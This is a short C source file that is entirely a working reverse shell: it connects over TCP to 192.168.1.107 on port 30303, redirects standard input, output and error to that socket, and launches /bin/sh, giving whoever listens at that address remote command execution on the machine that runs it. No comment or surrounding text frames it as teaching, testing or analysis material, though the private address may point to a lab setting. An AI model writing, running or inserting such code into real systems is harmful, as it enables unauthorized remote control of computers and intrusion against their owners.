#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(30303);
	inet_pton(AF_INET, "192.168.1.107", &sin.sin_addr.s_addr);
	connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
	dup2(sock, STDIN_FILENO);
	dup2(sock, STDOUT_FILENO);
	dup2(sock, STDERR_FILENO);
  	char *argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
}

